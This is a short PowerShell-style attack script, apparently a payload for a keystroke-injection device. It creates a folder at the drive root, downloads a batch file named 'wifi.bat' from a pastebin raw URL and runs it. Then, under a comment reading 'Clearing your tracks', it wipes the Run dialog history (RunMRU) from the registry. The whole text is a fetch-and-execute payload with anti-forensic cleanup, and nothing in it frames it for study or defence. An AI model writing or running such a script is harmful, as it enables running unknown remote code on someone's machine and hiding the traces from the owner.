cd /;mkdir x64;cd x64;
wget https://pastebin.com/raw/HNBtcyCb -OutFile wifi.bat
start wifi.bat

 // --> Clearing your tracks


Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

exit
